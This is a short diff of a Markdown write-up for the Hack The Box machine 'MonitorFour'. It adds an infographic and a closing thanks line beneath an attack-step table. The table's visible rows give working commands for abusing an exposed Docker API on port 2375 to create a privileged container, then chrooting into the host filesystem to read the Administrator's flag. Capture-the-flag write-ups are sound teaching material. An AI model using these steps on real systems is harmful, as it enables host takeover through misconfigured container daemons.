@@ -375,3 +375,9 @@ Event
 | **07** | Abuse Docker API | `curl -X POST -H "Content-Type: application/json" -d @priv_esc.json http://<container_ip>:2375/containers/create?name=escape` |
 | **08** | Host escape | Inside new container, `chroot /mnt/host sh -c 'cat c:/Users/Administrator/Desktop/root.txt'` |
 
+
+![MonitorFour](HTB_2025-12-23_11-43_infographics.png)
+
+
+**Thanks for read!**
+
